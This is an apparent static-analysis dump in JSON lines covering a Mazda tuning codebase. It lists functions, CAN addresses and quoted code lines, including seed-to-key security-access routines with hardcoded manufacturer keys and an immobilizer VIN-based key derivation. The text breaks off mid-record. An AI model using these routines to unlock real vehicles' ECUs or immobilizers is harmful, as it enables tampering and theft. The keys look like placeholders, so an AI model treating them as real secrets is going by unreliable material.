"pattern": "algorithm", "content": "\"\"\"Manufacturer Level 1 Algorithm\"\"\""}, {"type": "security_pattern", "line": 341, "pattern": "seed", "content": "if len(seed) != 8:"}, {"type": "security_pattern", "line": 342, "pattern": "seed", "content": "raise ValueError(\"Manufacturer algorithm requires 8-byte seed\")"}, {"type": "security_pattern", "line": 342, "pattern": "algorithm", "content": "raise ValueError(\"Manufacturer algorithm requires 8-byte seed\")"}, {"type": "security_pattern", "line": 345, "pattern": "key", "content": "manufacturer_key = self._get_manufacturer_key_level1()"}, {"type": "security_pattern", "line": 347, "pattern": "key", "content": "cipher = Cipher(algorithms.AES(manufacturer_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 347, "pattern": "algorithm", "content": "cipher = Cipher(algorithms.AES(manufacturer_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 347, "pattern": "cipher", "content": "cipher = Cipher(algorithms.AES(manufacturer_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 348, "pattern": "encrypt", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 348, "pattern": "cipher", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 350, "pattern": "key", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 350, "pattern": "encrypt", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 350, "pattern": "seed", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 351, "pattern": "key", "content": "return key"}, {"type": "security_pattern", "line": 353, "pattern": "seed", "content": "def _algorithm_manufacturer_level2(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 353, "pattern": "algorithm", "content": "def _algorithm_manufacturer_level2(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 355, "pattern": "algorithm", "content": "\"\"\"Manufacturer Level 2 Algorithm\"\"\""}, {"type": "security_pattern", "line": 356, "pattern": "seed", "content": "if len(seed) != 8:"}, {"type": "security_pattern", "line": 357, "pattern": "seed", "content": "raise ValueError(\"Manufacturer level 2 requires 8-byte seed\")"}, {"type": "security_pattern", "line": 360, "pattern": "key", "content": "manufacturer_key = self._get_manufacturer_key_level2()"}, {"type": "security_pattern", "line": 362, "pattern": "key", "content": "cipher = Cipher(algorithms.AES(manufacturer_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 362, "pattern": "algorithm", "content": "cipher = Cipher(algorithms.AES(manufacturer_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 362, "pattern": "cipher", "content": "cipher = Cipher(algorithms.AES(manufacturer_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 363, "pattern": "encrypt", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 363, "pattern": "cipher", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 366, "pattern": "seed", "content": "transformed_seed = bytearray(seed)"}, {"type": "security_pattern", "line": 368, "pattern": "seed", "content": "transformed_seed[i] = (transformed_seed[i] ^ 0xAA) + i"}, {"type": "security_pattern", "line": 370, "pattern": "key", "content": "key = encryptor.update(bytes(transformed_seed)) + encryptor.finalize()"}, {"type": "security_pattern", "line": 370, "pattern": "encrypt", "content": "key = encryptor.update(bytes(transformed_seed)) + encryptor.finalize()"}, {"type": "security_pattern", "line": 370, "pattern": "seed", "content": "key = encryptor.update(bytes(transformed_seed)) + encryptor.finalize()"}, {"type": "security_pattern", "line": 371, "pattern": "key", "content": "return key"}, {"type": "security_pattern", "line": 373, "pattern": "seed", "content": "def _algorithm_dealer_access(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 373, "pattern": "algorithm", "content": "def _algorithm_dealer_access(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 375, "pattern": "algorithm", "content": "\"\"\"Dealer Access Algorithm\"\"\""}, {"type": "security_pattern", "line": 376, "pattern": "seed", "content": "if len(seed) != 6:"}, {"type": "security_pattern", "line": 377, "pattern": "seed", "content": "raise ValueError(\"Dealer access requires 6-byte seed\")"}, {"type": "security_pattern", "line": 384, "pattern": "hash", "content": "vin_hash = hashlib.md5(vin.encode()).digest()"}, {"type": "security_pattern", "line": 385, "pattern": "seed", "content": "combined_data = seed + vin_hash[:2]"}, {"type": "security_pattern", "line": 385, "pattern": "hash", "content": "combined_data = seed + vin_hash[:2]"}, {"type": "security_pattern", "line": 388, "pattern": "key", "content": "key = bytearray(6)"}, {"type": "security_pattern", "line": 390, "pattern": "key", "content": "key[i] = (combined_data[i] ^ combined_data[(i+2) % 6]) + 0x30"}, {"type": "security_pattern", "line": 391, "pattern": "key", "content": "key[i] = ((key[i] << 2) | (key[i] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 393, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 395, "pattern": "seed", "content": "def _algorithm_north_america(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 395, "pattern": "algorithm", "content": "def _algorithm_north_america(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 397, "pattern": "algorithm", "content": "\"\"\"North America Regional Algorithm\"\"\""}, {"type": "security_pattern", "line": 398, "pattern": "seed", "content": "if len(seed) != 4:"}, {"type": "security_pattern", "line": 399, "pattern": "seed", "content": "raise ValueError(\"NA algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 399, "pattern": "algorithm", "content": "raise ValueError(\"NA algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 401, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 404, "pattern": "seed", "content": "temp = seed[i]"}, {"type": "security_pattern", "line": 409, "pattern": "key", "content": "key[i] = temp"}, {"type": "security_pattern", "line": 411, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 413, "pattern": "seed", "content": "def _algorithm_europe(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 413, "pattern": "algorithm", "content": "def _algorithm_europe(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 415, "pattern": "algorithm", "content": "\"\"\"Europe Regional Algorithm\"\"\""}, {"type": "security_pattern", "line": 416, "pattern": "seed", "content": "if len(seed) != 4:"}, {"type": "security_pattern", "line": 417, "pattern": "seed", "content": "raise ValueError(\"Europe algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 417, "pattern": "algorithm", "content": "raise ValueError(\"Europe algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 419, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 422, "pattern": "seed", "content": "temp = seed[i]"}, {"type": "security_pattern", "line": 427, "pattern": "key", "content": "key[i] = temp"}, {"type": "security_pattern", "line": 429, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 431, "pattern": "seed", "content": "def _algorithm_japan(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 431, "pattern": "algorithm", "content": "def _algorithm_japan(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 433, "pattern": "algorithm", "content": "\"\"\"Japan Regional Algorithm\"\"\""}, {"type": "security_pattern", "line": 434, "pattern": "seed", "content": "if len(seed) != 4:"}, {"type": "security_pattern", "line": 435, "pattern": "seed", "content": "raise ValueError(\"Japan algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 435, "pattern": "algorithm", "content": "raise ValueError(\"Japan algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 437, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 440, "pattern": "seed", "content": "temp = seed[i]"}, {"type": "security_pattern", "line": 445, "pattern": "key", "content": "key[i] = temp"}, {"type": "security_pattern", "line": 447, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 449, "pattern": "key", "content": "def _get_manufacturer_key_level1(self) -> bytes:"}, {"type": "security_pattern", "line": 450, "pattern": "key", "content": "\"\"\"Get manufacturer level 1 key\"\"\""}, {"type": "security_pattern", "line": 452, "pattern": "key", "content": "base_key = b'mazda_manufacturer_key_level1_2024'"}, {"type": "security_pattern", "line": 453, "pattern": "key", "content": "return hashlib.sha256(base_key).digest()[:16]"}, {"type": "security_pattern", "line": 453, "pattern": "hash", "content": "return hashlib.sha256(base_key).digest()[:16]"}, {"type": "security_pattern", "line": 455, "pattern": "key", "content": "def _get_manufacturer_key_level2(self) -> bytes:"}, {"type": "security_pattern", "line": 456, "pattern": "key", "content": "\"\"\"Get manufacturer level 2 key\"\"\""}, {"type": "security_pattern", "line": 458, "pattern": "key", "content": "base_key = b'mazda_manufacturer_key_level2_2024_secure'"}, {"type": "security_pattern", "line": 459, "pattern": "key", "content": "return hashlib.sha256(base_key).digest()[:16]"}, {"type": "security_pattern", "line": 459, "pattern": "hash", "content": "return hashlib.sha256(base_key).digest()[:16]"}, {"type": "security_pattern", "line": 461, "pattern": "algorithm", "content": "def list_all_algorithms(self) -> List[str]:"}, {"type": "security_pattern", "line": 462, "pattern": "algorithm", "content": "\"\"\"List all available algorithms\"\"\""}, {"type": "security_pattern", "line": 463, "pattern": "key", "content": "return list(self.algorithm_database.keys())"}, {"type": "security_pattern", "line": 463, "pattern": "algorithm", "content": "return list(self.algorithm_database.keys())"}, {"type": "security_pattern", "line": 465, "pattern": "algorithm", "content": "def get_algorithm_info(self, algorithm_name: str) -> Dict[str, Any]:"}, {"type": "security_pattern", "line": 466, "pattern": "algorithm", "content": "\"\"\"Get information about specific algorithm\"\"\""}, {"type": "security_pattern", "line": 467, "pattern": "algorithm", "content": "if algorithm_name not in self.algorithm_database:"}, {"type": "security_pattern", "line": 468, "pattern": "algorithm", "content": "return {\"error\": \"Algorithm not found\"}"}, {"type": "security_pattern", "line": 471, "pattern": "algorithm", "content": "\"name\": algorithm_name,"}, {"type": "security_pattern", "line": 472, "pattern": "algorithm", "content": "\"description\": self._get_algorithm_description(algorithm_name),"}, {"type": "security_pattern", "line": 473, "pattern": "seed", "content": "\"seed_length\": self._get_algorithm_seed_length(algorithm_name),"}, {"type": "security_pattern", "line": 473, "pattern": "algorithm", "content": "\"seed_length\": self._get_algorithm_seed_length(algorithm_name),"}, {"type": "security_pattern", "line": 474, "pattern": "key", "content": "\"key_length\": self._get_algorithm_key_length(algorithm_name),"}, {"type": "security_pattern", "line": 474, "pattern": "algorithm", "content": "\"key_length\": self._get_algorithm_key_length(algorithm_name),"}, {"type": "security_pattern", "line": 475, "pattern": "algorithm", "content": "\"vin_required\": self._is_vin_required(algorithm_name)"}, {"type": "security_pattern", "line": 480, "pattern": "algorithm", "content": "def _get_algorithm_description(self, algorithm_name: str) -> str:"}, {"type": "security_pattern", "line": 481, "pattern": "algorithm", "content": "\"\"\"Get algorithm description\"\"\""}, {"type": "security_pattern", "line": 483, "pattern": "algorithm", "content": "\"ALG_27_STANDARD\": \"Standard 0x27 security access algorithm\","}, {"type": "security_pattern", "line": 484, "pattern": "algorithm", "content": "\"ALG_27_ENHANCED\": \"Enhanced 0x27 algorithm with additional security\","}, {"type": "security_pattern", "line": 485, "pattern": "algorithm", "content": "\"ENGINE_ECU_2011\": \"2011 Mazdaspeed 3 engine ECU specific algorithm\","}, {"type": "security_pattern", "line": 486, "pattern": "key", "content": "\"IMMOBILIZER_2011\": \"2011 immobilizer system with VIN-based key derivation\","}, {"type": "security_pattern", "line": 487, "pattern": "encrypt", "content": "\"MANUFACTURER_LEVEL1\": \"Manufacturer level 1 access with AES encryption\","}, {"type": "security_pattern", "line": 490, "pattern": "algorithm", "content": "return descriptions.get(algorithm_name, \"No description available\")"}, {"type": "security_pattern", "line": 492, "pattern": "seed", "content": "def _get_algorithm_seed_length(self, algorithm_name: str) -> int:"}, {"type": "security_pattern", "line": 492, "pattern": "algorithm", "content": "def _get_algorithm_seed_length(self, algorithm_name: str) -> int:"}, {"type": "security_pattern", "line": 493, "pattern": "seed", "content": "\"\"\"Get required seed length for algorithm\"\"\""}, {"type": "security_pattern", "line": 493, "pattern": "algorithm", "content": "\"\"\"Get required seed length for algorithm\"\"\""}, {"type": "security_pattern", "line": 504, "pattern": "algorithm", "content": "return length_map.get(algorithm_name, 4)"}, {"type": "security_pattern", "line": 506, "pattern": "key", "content": "def _get_algorithm_key_length(self, algorithm_name: str) -> int:"}, {"type": "security_pattern", "line": 506, "pattern": "algorithm", "content": "def _get_algorithm_key_length(self, algorithm_name: str) -> int:"}, {"type": "security_pattern", "line": 507, "pattern": "key", "content": "\"\"\"Get output key length for algorithm\"\"\""}, {"type": "security_pattern", "line": 507, "pattern": "algorithm", "content": "\"\"\"Get output key length for algorithm\"\"\""}, {"type": "security_pattern", "line": 518, "pattern": "algorithm", "content": "return length_map.get(algorithm_name, 4)"}, {"type": "security_pattern", "line": 520, "pattern": "algorithm", "content": "def _is_vin_required(self, algorithm_name: str) -> bool:"}, {"type": "security_pattern", "line": 521, "pattern": "algorithm", "content": "\"\"\"Check if algorithm requires VIN\"\"\""}, {"type": "security_pattern", "line": 527, "pattern": "algorithm", "content": "return algorithm_name in vin_required"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/complete_tuner/mds11.py", "lines_read": 993, "features_found": [{"type": "function", "name": "__init__", "line": 51}, {"type": "function", "name": "perform_system_scan", "line": 57}, {"type": "function", "name": "_scan_engine_system", "line": 128}, {"type": "function", "name": "_scan_transmission_system", "line": 169}, {"type": "function", "name": "_scan_abs_system", "line": 196}, {"type": "function", "name": "_scan_airbag_system", "line": 221}, {"type": "function", "name": "_scan_bcm_system", "line": 241}, {"type": "function", "name": "_scan_immobilizer_system", "line": 267}, {"type": "function", "name": "_read_engine_rpm", "line": 288}, {"type": "function", "name": "_read_coolant_temp", "line": 299}, {"type": "function", "name": "_read_throttle_position", "line": 310}, {"type": "function", "name": "_read_maf_flow", "line": 321}, {"type": "function", "name": "_read_boost_pressure", "line": 332}, {"type": "function", "name": "_read_fuel_trim", "line": 344}, {"type": "function", "name": "_check_engine_sensors", "line": 361}, {"type": "function", "name": "_check_engine_actuators", "line": 387}, {"type": "function", "name": "_check_oxygen_sensor", "line": 413}, {"type": "function", "name": "_check_knock_sensor", "line": 428}, {"type": "function", "name": "_check_crank_sensor", "line": 443}, {"type": "function", "name": "_check_cam_sensor", "line": 451}, {"type": "function", "name": "_check_fuel_injectors", "line": 456}, {"type": "function", "name": "_check_ignition_coils", "line": 473}, {"type": "function", "name": "_check_throttle_actuator", "line": 478}, {"type": "function", "name": "_check_vvt_solenoids", "line": 491}, {"type": "function", "name": "_calculate_system_status", "line": 496}, {"type": "function", "name": "perform_active_test", "line": 553}, {"type": "function", "name": "_get_test_definition", "line": 612}, {"type": "function", "name": "_perform_active_component_test", "line": 655}, {"type": "function", "name": "_perform_system_test", "line": 671}, {"type": "function", "name": "_perform_component_test", "line": 687}, {"type": "function", "name": "_test_fuel_pump", "line": 692}, {"type": "function", "name": "_test_ignition_system", "line": 733}, {"type": "function", "name": "_test_ignition_coil", "line": 764}, {"type": "function", "name": "_test_boost_control", "line": 773}, {"type": "function", "name": "_test_vvt_system", "line": 812}, {"type": "function", "name": "monitor_live_data", "line": 842}, {"type": "function", "name": "_read_parameter", "line": 901}, {"type": "function", "name": "_check_parameter_alerts", "line": 917}, {"type": "function", "name": "_calculate_data_statistics", "line": 948}, {"type": "function", "name": "get_current_test_status", "line": 973}, {"type": "function", "name": "abort_current_test", "line": 985}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "Enum,", "line": null}, {"type": "import", "module": "dataclass", "line": null}], "components_found": [{"type": "class", "name": "DiagnosticTestType", "line": 17}, {"type": "class", "name": "TestStatus", "line": 26}, {"type": "class", "name": "DiagnosticTest", "line": 35}, {"type": "class", "name": "MazdaDiagnosticService", "line": 45}], "algorithms": [{"type": "algorithm_function", "line": 496, "content": "def _calculate_system_status(self, scan_results: Dict[str, Any]) -> Dict[str, str]:"}, {"type": "algorithm_function", "line": 948, "content": "def _calculate_data_statistics(self, data_samples: List[Dict[str, Any]]) -> Dict[str, Any]:"}], "protocols": [{"type": "protocol", "line": 19, "protocol": "0x[0-9A-Fa-f]+", "content": "ACTIVE_TEST = 0x01"}, {"type": "protocol", "line": 20, "protocol": "0x[0-9A-Fa-f]+", "content": "SYSTEM_TEST = 0x02"}, {"type": "protocol", "line": 21, "protocol": "0x[0-9A-Fa-f]+", "content": "COMPONENT_TEST = 0x03"}, {"type": "protocol", "line": 22, "protocol": "0x[0-9A-Fa-f]+", "content": "ADAPTATION_TEST = 0x04"}, {"type": "protocol", "line": 23, "protocol": "0x[0-9A-Fa-f]+", "content": "CALIBRATION_TEST = 0x05"}, {"type": "protocol", "line": 24, "protocol": "0x[0-9A-Fa-f]+", "content": "MEMORY_TEST = 0x06"}, {"type": "protocol", "line": 28, "protocol": "0x[0-9A-Fa-f]+", "content": "NOT_STARTED = 0x00"}, {"type": "protocol", "line": 29, "protocol": "0x[0-9A-Fa-f]+", "content": "IN_PROGRESS = 0x01"}, {"type": "protocol", "line": 30, "protocol": "0x[0-9A-Fa-f]+", "content": "COMPLETED = 0x02"}, {"type": "protocol", "line": 31, "protocol": "0x[0-9A-Fa-f]+", "content": "FAILED = 0x03"}, {"type": "protocol", "line": 32, "protocol": "0x[0-9A-Fa-f]+", "content": "ABORTED = 0x04"}, {"type": "protocol", "line": 103, "protocol": "0x[0-9A-Fa-f]+", "content": "dtc_info = self.diagnostic_protocol.read_dtc_information(0x02)"}, {"type": "protocol", "line": 291, "protocol": "0x[0-9A-Fa-f]+", "content": "rpm_data = self.diagnostic_protocol.read_data_by_identifier(0x010C)"}, {"type": "protocol", "line": 302, "protocol": "0x[0-9A-Fa-f]+", "content": "temp_data = self.diagnostic_protocol.read_data_by_identifier(0x0105)"}, {"type": "protocol", "line": 313, "protocol": "0x[0-9A-Fa-f]+", "content": "throttle_data = self.diagnostic_protocol.read_data_by_identifier(0x0111)"}, {"type": "protocol", "line": 324, "protocol": "0x[0-9A-Fa-f]+", "content": "maf_data = self.diagnostic_protocol.read_data_by_identifier(0x0110)"}, {"type": "protocol", "line": 336, "protocol": "0x[0-9A-Fa-f]+", "content": "boost_data = self.diagnostic_protocol.read_data_by_identifier(0x220109)"}, {"type": "protocol", "line": 347, "protocol": "0x[0-9A-Fa-f]+", "content": "stft_data = self.diagnostic_protocol.read_data_by_identifier(0x0106)"}, {"type": "protocol", "line": 348, "protocol": "0x[0-9A-Fa-f]+", "content": "ltft_data = self.diagnostic_protocol.read_data_by_identifier(0x0107)"}, {"type": "protocol", "line": 417, "protocol": "0x[0-9A-Fa-f]+", "content": "o2_data = self.diagnostic_protocol.read_data_by_identifier(0x0114)"}, {"type": "protocol", "line": 432, "protocol": "0x[0-9A-Fa-f]+", "content": "knock_data = self.diagnostic_protocol.read_data_by_identifier(0x22010C)"}, {"type": "protocol", "line": 615, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0101: DiagnosticTest("}, {"type": "protocol", "line": 616, "protocol": "0x[0-9A-Fa-f]+", "content": "test_id=0x0101,"}, {"type": "protocol", "line": 624, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0102: DiagnosticTest("}, {"type": "protocol", "line": 625, "protocol": "0x[0-9A-Fa-f]+", "content": "test_id=0x0102,"}, {"type": "protocol", "line": 633, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0103: DiagnosticTest("}, {"type": "protocol", "line": 634, "protocol": "0x[0-9A-Fa-f]+", "content": "test_id=0x0103,"}, {"type": "protocol", "line": 642, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0104: DiagnosticTest("}, {"type": "protocol", "line": 643, "protocol": "0x[0-9A-Fa-f]+", "content": "test_id=0x0104,"}, {"type": "protocol", "line": 660, "protocol": "0x[0-9A-Fa-f]+", "content": "if test.test_id == 0x0101:  # Fuel Pump Test"}, {"type": "protocol", "line": 662, "protocol": "0x[0-9A-Fa-f]+", "content": "elif test.test_id == 0x0102:  # Ignition System Test"}, {"type": "protocol", "line": 676, "protocol": "0x[0-9A-Fa-f]+", "content": "if test.test_id == 0x0103:  # Boost Control Test"}, {"type": "protocol", "line": 678, "protocol": "0x[0-9A-Fa-f]+", "content": "elif test.test_id == 0x0104:  # VVT System Test"}], "hardware_assumptions": [{"type": "hardware", "line": 59, "hardware": "vehicle", "content": "Perform complete vehicle system scan"}, {"type": "hardware", "line": 64, "hardware": "vehicle", "content": "logger.info(\"Starting complete vehicle system scan...\")"}, {"type": "hardware", "line": 79, "hardware": "ABS", "content": "('ABS', self._scan_abs_system),"}, {"type": "hardware", "line": 81, "hardware": "BCM", "content": "('BCM', self._scan_bcm_system),"}, {"type": "hardware", "line": 82, "hardware": "immobilizer", "content": "('IMMOBILIZER', self._scan_immobilizer_system)"}, {"type": "hardware", "line": 196, "hardware": "ABS", "content": "def _scan_abs_system(self) -> Dict[str, Any]:"}, {"type": "hardware", "line": 197, "hardware": "ABS", "content": "\"\"\"Scan ABS system\"\"\""}, {"type": "hardware", "line": 198, "hardware": "ABS", "content": "abs_scan = {"}, {"type": "hardware", "line": 206, "hardware": "ABS", "content": "abs_scan['communication_ok'] = True  # Simulated"}, {"type": "hardware", "line": 209, "hardware": "ABS", "content": "abs_scan['parameters'] = {"}, {"type": "hardware", "line": 211, "hardware": "ABS", "content": "'abs_status': 'Normal'"}, {"type": "hardware", "line": 214, "hardware": "ABS", "content": "return abs_scan"}, {"type": "hardware", "line": 217, "hardware": "ABS", "content": "logger.error(f\"Error scanning ABS system: {e}\")"}, {"type": "hardware", "line": 218, "hardware": "ABS", "content": "abs_scan['error'] = str(e)"}, {"type": "hardware", "line": 219, "hardware": "ABS", "content": "return abs_scan"}, {"type": "hardware", "line": 241, "hardware": "BCM", "content": "def _scan_bcm_system(self) -> Dict[str, Any]:"}, {"type": "hardware", "line": 243, "hardware": "BCM", "content": "bcm_scan = {"}, {"type": "hardware", "line": 251, "hardware": "BCM", "content": "bcm_scan['communication_ok'] = True  # Simulated"}, {"type": "hardware", "line": 254, "hardware": "BCM", "content": "bcm_scan['parameters'] = {"}, {"type": "hardware", "line": 255, "hardware": "vehicle", "content": "'vehicle_voltage': 12.5,"}, {"type": "hardware", "line": 260, "hardware": "BCM", "content": "return bcm_scan"}, {"type": "hardware", "line": 263, "hardware": "BCM", "content": "logger.error(f\"Error scanning BCM system: {e}\")"}, {"type": "hardware", "line": 264, "hardware": "BCM", "content": "bcm_scan['error'] = str(e)"}, {"type": "hardware", "line": 265, "hardware": "BCM", "content": "return bcm_scan"}, {"type": "hardware", "line": 267, "hardware": "immobilizer", "content": "def _scan_immobilizer_system(self) -> Dict[str, Any]:"}, {"type": "hardware", "line": 268, "hardware": "immobilizer", "content": "\"\"\"Scan immobilizer system\"\"\""}, {"type": "hardware", "line": 269, "hardware": "immobilizer", "content": "immobilizer_scan = {"}, {"type": "hardware", "line": 277, "hardware": "immobilizer", "content": "immobilizer_scan['communication_ok'] = True  # Simulated"}, {"type": "hardware", "line": 278, "hardware": "immobilizer", "content": "immobilizer_scan['status'] = 'Active'"}, {"type": "hardware", "line": 279, "hardware": "immobilizer", "content": "immobilizer_scan['key_status'] = 'Recognized'"}, {"type": "hardware", "line": 281, "hardware": "immobilizer", "content": "return immobilizer_scan"}, {"type": "hardware", "line": 284, "hardware": "immobilizer", "content": "logger.error(f\"Error scanning immobilizer system: {e}\")"}, {"type": "hardware", "line": 285, "hardware": "immobilizer", "content": "immobilizer_scan['error'] = str(e)"}, {"type": "hardware", "line": 286, "hardware": "immobilizer", "content": "return immobilizer_scan"}, {"type": "hardware", "line": 465, "hardware": "ABS", "content": "if abs(stft) < 10 and abs(ltft) < 10:"}, {"type": "hardware", "line": 540, "hardware": "ABS", "content": "safety_systems = ['AIRBAG', 'ABS']"}], "security_logic": [{"type": "security_pattern", "line": 272, "pattern": "key", "content": "'key_status': 'Unknown'"}, {"type": "security_pattern", "line": 279, "pattern": "key", "content": "immobilizer_scan['key_status'] = 'Recognized'"}, {"type": "security_pattern", "line": 957, "pattern": "key", "content": "parameters = list(first_sample['values'].keys())"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/complete_tuner/mds12.py", "lines_read": 509, "features_found": [{"type": "function", "name": "__init__", "line": 41}, {"type": "function", "name": "connect", "line": 64}, {"type": "function", "name": "_setup_can_filters", "line": 92}, {"type": "function", "name": "disconnect", "line": 102}, {"type": "function", "name": "send_frame", "line": 117}, {"type": "function", "name": "receive_frame", "line": 158}, {"type": "function", "name": "start_receive_thread", "line": 215}, {"type": "function", "name": "stop_receive_thread", "line": 232}, {"type": "function", "name": "_receive_loop", "line": 244}, {"type": "function", "name": "send_diagnostic_message", "line": 257}, {"type": "function", "name": "receive_diagnostic_message", "line": 295}, {"type": "function", "name": "monitor_bus_traffic", "line": 327}, {"type": "function", "name": "_identify_mazda_message", "line": 384}, {"type": "function", "name": "perform_bus_health_check", "line": 403}, {"type": "function", "name": "set_bitrate", "line": 473}, {"type": "function", "name": "get_interface_status", "line": 494}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "socket", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "IntEnum", "line": null}, {"type": "import", "module": "dataclass", "line": null}], "components_found": [{"type": "class", "name": "CANFrameType", "line": 19}, {"type": "class", "name": "CANFrame", "line": 27}, {"type": "class", "name": "MazdaCANInterface", "line": 35}], "algorithms": [], "protocols": [{"type": "protocol", "line": 4, "protocol": "CAN", "content": "CAN INTERFACE - Complete CAN Bus Communication"}, {"type": "protocol", "line": 5, "protocol": "CAN", "content": "Direct CAN interface implementation for Mazda vehicles"}, {"type": "protocol", "line": 19, "protocol": "CAN", "content": "class CANFrameType(IntEnum):"}, {"type": "protocol", "line": 20, "protocol": "CAN", "content": "\"\"\"CAN Frame Types\"\"\""}, {"type": "protocol", "line": 21, "protocol": "0x[0-9A-Fa-f]+", "content": "STANDARD = 0x01  # 11-bit identifier"}, {"type": "protocol", "line": 22, "protocol": "0x[0-9A-Fa-f]+", "content": "EXTENDED = 0x02  # 29-bit identifier"}, {"type": "protocol", "line": 23, "protocol": "0x[0-9A-Fa-f]+", "content": "REMOTE = 0x03    # Remote transmission request"}, {"type": "protocol", "line": 24, "protocol": "0x[0-9A-Fa-f]+", "content": "ERROR = 0x04     # Error frame"}, {"type": "protocol", "line": 27, "protocol": "CAN", "content": "class CANFrame:"}, {"type": "protocol", "line": 28, "protocol": "CAN", "content": "\"\"\"CAN Frame Structure\"\"\""}, {"type": "protocol", "line": 31, "protocol": "CAN", "content": "frame_type: CANFrameType = CANFrameType.STANDARD"}, {"type": "protocol", "line": 35, "protocol": "CAN", "content": "class MazdaCANInterface:"}, {"type": "protocol", "line": 37, "protocol": "CAN", "content": "Complete CAN Interface for Mazda Vehicle Communication"}, {"type": "protocol", "line": 38, "protocol": "CAN", "content": "Provides direct CAN bus access for advanced diagnostics"}, {"type": "protocol", "line": 52, "protocol": "0x[0-9A-Fa-f]+", "content": "'ECU_TX': 0x7E0,"}, {"type": "protocol", "line": 53, "protocol": "0x[0-9A-Fa-f]+", "content": "'ECU_RX': 0x7E8,"}, {"type": "protocol", "line": 54, "protocol": "0x[0-9A-Fa-f]+", "content": "'TCM_TX': 0x7E1,"}, {"type": "protocol", "line": 55, "protocol": "0x[0-9A-Fa-f]+", "content": "'TCM_RX': 0x7E9,"}, {"type": "protocol", "line": 56, "protocol": "0x[0-9A-Fa-f]+", "content": "'ABS_TX': 0x7E2,"}, {"type": "protocol", "line": 57, "protocol": "0x[0-9A-Fa-f]+", "content": "'ABS_RX': 0x7EA,"}, {"type": "protocol", "line": 58, "protocol": "0x[0-9A-Fa-f]+", "content": "'BCM_TX': 0x7E6,"}, {"type": "protocol", "line": 59, "protocol": "0x[0-9A-Fa-f]+", "content": "'BCM_RX': 0x7EE,"}, {"type": "protocol", "line": 60, "protocol": "0x[0-9A-Fa-f]+", "content": "'GATEWAY_TX': 0x750,"}, {"type": "protocol", "line": 61, "protocol": "0x[0-9A-Fa-f]+", "content": "'GATEWAY_RX': 0x758"}, {"type": "protocol", "line": 66, "protocol": "CAN", "content": "Connect to CAN interface"}, {"type": "protocol", "line": 72, "protocol": "CAN", "content": "logger.info(f\"Connecting to CAN interface: {self.interface}\")"}, {"type": "protocol", "line": 75, "protocol": "CAN", "content": "self.socket = socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW)"}, {"type": "protocol", "line": 84, "protocol": "CAN", "content": "logger.info(f\"Successfully connected to CAN interface: {self.interface}\")"}, {"type": "protocol", "line": 88, "protocol": "CAN", "content": "logger.error(f\"Failed to connect to CAN interface: {e}\")"}, {"type": "protocol", "line": 93, "protocol": "CAN", "content": "\"\"\"Setup CAN frame filters\"\"\""}, {"type": "protocol", "line": 100, "protocol": "CAN", "content": "logger.warning(f\"Could not setup CAN filters: {e}\")"}, {"type": "protocol", "line": 103, "protocol": "CAN", "content": "\"\"\"Disconnect from CAN interface\"\"\""}, {"type": "protocol", "line": 112, "protocol": "CAN", "content": 